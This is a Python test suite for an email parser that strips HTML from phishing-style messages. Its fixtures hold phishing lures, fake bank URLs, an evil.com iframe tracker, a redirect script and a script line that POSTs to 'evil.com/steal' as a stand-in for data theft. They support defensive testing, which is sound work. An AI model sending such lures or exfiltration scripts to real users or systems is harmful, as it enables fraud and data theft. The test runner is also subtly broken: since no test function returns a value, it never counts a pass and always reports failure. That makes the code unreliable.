#!/usr/bin/env python3
"""
Test suite to validate HTML leakage fixes in email parser.
"""

import re
import tempfile
import json
from parse_email import EmailParser

def test_html_cleaning_consistency():
    """Test that HTML cleaning is consistent between artifact extraction and plain_text."""
    
    # Test email with HTML content and embedded URLs
    test_email = b"""From: attacker@evil.com
To: victim@company.com
Subject: Urgent Security Alert
Content-Type: text/html; charset=utf-8

<html>
<body>
<p>Dear valued customer,</p>
<p>Your account has been <strong>suspended</strong> due to suspicious activity.</p>
<p>Please <a href="http://bit.ly/fake-bank">click here immediately</a> to verify your account.</p>
<p>Alternatively, visit: <a href="https://fake-bank.evil.com/login">https://fake-bank.evil.com/login</a></p>
<script>alert('xss')</script>
<style>.hidden { display: none; }</style>
</body>
</html>"""
    
    parser = EmailParser()
    result = parser.parse(test_email, "test_html_cleaning.eml")
    
    # CRITICAL TESTS
    plain_text = result.get('plain_text', '')
    artifacts = result.get('extracted_artifacts', {})
    
    print("=== HTML Cleaning Consistency Test ===")
    print(f"Plain text length: {len(plain_text)}")
    print(f"URLs found: {artifacts.get('statistics', {}).get('total_urls', 0)}")
    
    # Test 1: No HTML tags in plain_text
    html_tags = re.findall(r'<[^>]+>', plain_text)
    assert not html_tags, f"HTML tags found in plain_text: {html_tags}"
    print("✓ No HTML tags in plain_text")
    
    # Test 2: No script/style content in plain_text
    assert 'alert(' not in plain_text, "Script content found in plain_text"
    assert '.hidden' not in plain_text, "Style content found in plain_text"
    print("✓ No script/style content in plain_text")

    # Test 3: URLs should not be appended to plain_text
    assert 'Extracted URLs:' not in plain_text
    print("✓ No appended URL section in plain_text")

    # Test 4: URLs preserved in both plain_text and artifacts
    urls_in_artifacts = [url['original_url'] for url in artifacts.get('urls', [])]
    assert 'bit.ly/fake-bank' in str(urls_in_artifacts) or 'bit.ly/fake-bank' in plain_text
    assert 'fake-bank.evil.com' in str(urls_in_artifacts) or 'fake-bank.evil.com' in plain_text
    print("✓ URLs preserved in artifacts and/or plain_text")

    # Test 5: Core message content preserved
    assert 'suspended' in plain_text.lower()
    assert 'verify' in plain_text.lower()
    print("✓ Core message content preserved")

def test_nested_html_cleaning():
    """Test HTML cleaning in nested email structures."""
    
    # Forwarded email with HTML content
    test_email = b"""From: user@company.com
To: soc@company.com
Subject: FW: Suspicious Email
Content-Type: message/rfc822

From: attacker@evil.com
To: user@company.com
Subject: Account Verification Required
Content-Type: multipart/alternative; boundary="boundary123"

--boundary123
Content-Type: text/plain; charset=utf-8

Please verify your account at: http://t.co/malicious

--boundary123
Content-Type: text/html; charset=utf-8

<html>
<body>
<h1>Urgent Action Required</h1>
<p>Click <a href="http://t.co/malicious">here</a> to verify.</p>
<p>Or visit: <strong>https://fake-site.com/verify</strong></p>
<iframe src="http://evil.com/tracker"></iframe>
</body>
</html>

--boundary123--"""
    
    parser = EmailParser()
    result = parser.parse(test_email, "test_nested_html.eml")
    
    plain_text = result.get('plain_text', '')
    artifacts = result.get('extracted_artifacts', {})
    
    print("\n=== Nested HTML Cleaning Test ===")
    print(f"Plain text length: {len(plain_text)}")
    
    # Test 1: No HTML tags from nested content
    html_tags = re.findall(r'<[^>]+>', plain_text)
    assert not html_tags, f"HTML tags from nested content: {html_tags}"
    print("✓ No HTML tags from nested content")
    
    # Test 2: Malicious content removed
    assert '<iframe' not in plain_text
    assert 'evil.com/tracker' not in plain_text or 'evil.com/tracker' in str(artifacts.get('urls', []))
    print("✓ Malicious iframe content handled correctly")
    
    # Test 3: URLs extracted from nested content
    urls_found = artifacts.get('statistics', {}).get('total_urls', 0)
    assert urls_found >= 2, f"Expected at least 2 URLs, found {urls_found}"
    print(f"✓ URLs extracted from nested content: {urls_found}")

def test_mislabeled_html_content():
    """Test detection of HTML content with incorrect MIME type."""
    
    # HTML content mislabeled as text/plain (common phishing technique)
    test_email = b"""From: attacker@evil.com
To: victim@company.com
Subject: Account Alert
Content-Type: text/plain; charset=utf-8

<html><body>
<p>Your account needs <b>immediate</b> attention!</p>
<a href="http://bit.ly/urgent">Click here now</a>
<script>window.location='http://evil.com'</script>
</body></html>"""
    
    parser = EmailParser()
    result = parser.parse(test_email, "test_mislabeled_html.eml")
    
    plain_text = result.get('plain_text', '')
    artifacts = result.get('extracted_artifacts', {})
    
    print("\n=== Mislabeled HTML Content Test ===")
    print(f"Plain text preview: {plain_text[:100]}...")
    
    # Test 1: HTML detected and cleaned despite wrong MIME type
    html_tags = re.findall(r'<[^>]+>', plain_text)
    if html_tags:
        print(f"⚠️ HTML tags still present: {html_tags}")
        # This might be expected if content is too ambiguous
    else:
        print("✓ HTML content properly detected and cleaned")
    
    # Test 2: Malicious script removed
    assert 'window.location' not in plain_text
    assert '<script>' not in plain_text
    print("✓ Malicious script content removed")
    
    # Test 3: URL extracted
    urls_found = artifacts.get('statistics', {}).get('total_urls', 0)
    assert urls_found >= 1, f"Expected at least 1 URL, found {urls_found}"
    print(f"✓ URLs extracted: {urls_found}")

def test_complex_nested_structure():
    """Test deeply nested email structure with mixed content types."""
    
    # Create complex nested structure
    test_email = b"""From: soc@company.com
Subject: Forwarded Phishing Sample
Content-Type: multipart/mixed; boundary="outer"

--outer
Content-Type: text/plain

This is a forwarded phishing email for analysis.

--outer
Content-Type: message/rfc822

From: forwarded@company.com
Subject: FW: Important Update
Content-Type: multipart/alternative; boundary="inner"

--inner
Content-Type: text/plain

Important update: visit www.example.com

--inner
Content-Type: text/html

<html>
<head><title>Phishing Page</title></head>
<body>
<h2>Banking Update Required</h2>
<p>Visit <a href="https://fake-bank.phish.com/update">our secure portal</a></p>
<div style="display:none">Hidden tracking: http://evil.com/track</div>
<script>fetch('http://evil.com/steal', {method: 'POST'})</script>
</body>
</html>

--inner--

--outer--"""
    
    parser = EmailParser()
    result = parser.parse(test_email, "test_complex_nested.eml")
    
    plain_text = result.get('plain_text', '')
    artifacts = result.get('extracted_artifacts', {})
    content_blocks = result.get('content', [])
    
    print("\n=== Complex Nested Structure Test ===")
    print(f"Content blocks: {len(content_blocks)}")
    print(f"Plain text length: {len(plain_text)}")
    
    # Test 1: No HTML in final plain_text
    html_tags = re.findall(r'<[^>]+>', plain_text)
    assert not html_tags, f"HTML tags in complex nested structure: {html_tags}"
    print("✓ No HTML tags in complex nested plain_text")
    
    # Test 2: All URLs found despite nesting
    urls_found = artifacts.get('statistics', {}).get('total_urls', 0)
    expected_urls = ['www.example.com', 'fake-bank.phish.com', 'evil.com']
    
    all_urls_text = str(artifacts.get('urls', [])) + plain_text
    found_count = sum(1 for url in expected_urls if url in all_urls_text)
    
    print(f"✓ Found {found_count}/{len(expected_urls)} expected URLs")
    
    # Test 3: Malicious content removed
    assert '<script>' not in plain_text
    assert 'fetch(' not in plain_text
    assert 'display:none' not in plain_text
    print("✓ Malicious content removed from nested structure")

def run_all_tests():
    """Run all HTML leakage tests."""
    
    tests = [
        test_html_cleaning_consistency,
        test_nested_html_cleaning,
        test_mislabeled_html_content,
        test_complex_nested_structure
    ]
    
    print("Running HTML Leakage Prevention Tests...")
    print("=" * 50)
    
    passed = 0
    for test in tests:
        try:
            if test():
                passed += 1
        except AssertionError as e:
            print(f"❌ {test.__name__} FAILED: {e}")
        except Exception as e:
            print(f"💥 {test.__name__} ERROR: {e}")
    
    print(f"\n📊 Results: {passed}/{len(tests)} tests passed")
    
    if passed == len(tests):
        print("🎉 All tests passed! HTML leakage fixes are working correctly.")
    else:
        print("⚠️ Some tests failed. Review the fixes and implementation.")
    
    return passed == len(tests)

if __name__ == "__main__":
    run_all_tests()